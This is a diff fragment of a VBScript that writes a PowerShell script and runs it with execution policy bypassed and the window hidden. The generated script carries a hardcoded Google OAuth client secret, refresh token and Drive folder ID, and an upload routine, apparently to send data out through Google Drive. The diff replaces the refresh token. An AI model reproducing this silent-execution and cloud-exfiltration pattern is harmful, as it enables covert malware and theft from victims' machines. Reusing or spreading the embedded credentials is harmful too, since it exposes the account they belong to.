@@ -31,7 +31,7 @@ Set objFile = objFSO.CreateTextFile(strPSPath, True)
 objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
 objFile.WriteLine "$CID = '677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com'"
 objFile.WriteLine "$SEC = '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'"
-objFile.WriteLine "$TOK = '1//04Wgd9wo8o6KxCgYIARAAGAQSNwF-L9IrJKtMejKeAJlaDvduwFH72cEfAe0hnRhUeIF1DuduS5WgeoVR8EcZUhXRJzfpMTEP-c0'"
+objFile.WriteLine "$TOK = '1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io'"
 objFile.WriteLine "$BaseID = '1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff'"
 
 ' Auth Handshake
@@ -73,4 +73,5 @@ objFile.WriteLine "} else { Up 'STOPPED.txt' ([text.encoding]::UTF8.GetBytes('Up
 objFile.Close
 
 ' 4. Final Execution (Silent)
+
 objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True
